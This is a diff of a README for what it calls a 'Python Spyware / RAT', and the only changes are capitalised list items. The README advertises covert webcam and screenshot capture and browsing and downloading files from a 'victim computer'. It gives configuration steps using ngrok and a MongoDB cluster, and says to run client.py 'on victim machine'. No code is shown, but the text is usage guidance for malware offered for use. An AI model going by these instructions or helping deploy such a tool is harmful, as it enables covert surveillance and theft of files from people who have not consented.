@@ -1,18 +1,18 @@
 # Python Spyware / RAT
 
 Features:-
- 1) no port forwarding required
- 2) get webcam images in real time
- 3) get screenshot images in real time
- 4) browse through files on victim computer
- 5) download files from victim computer to your local machine
+ 1) No port forwarding required
+ 2) Get webcam images in real time
+ 3) Get screenshot images in real time
+ 4) Browse through files on victim computer
+ 5) Download files from victim computer to your local machine
 
 How to Configure:-
- 1) download ngrok, and copy ngrok.exe file to /main/
- 2) get your mongodb cluster url
- 3) replace the client variable in all three python files with your mongodb cluster url
+ 1) Download ngrok, and copy ngrok.exe file to /main/
+ 2) Get your mongodb cluster url
+ 3) Replace the client variable in all three python files with your mongodb cluster url
 
 How to run:-
- 1) run server.py
- 2) run client.py on victim machine
- 3) run master.py
+ 1) Run server.py
+ 2) Run client.py on victim machine
+ 3) Run master.py
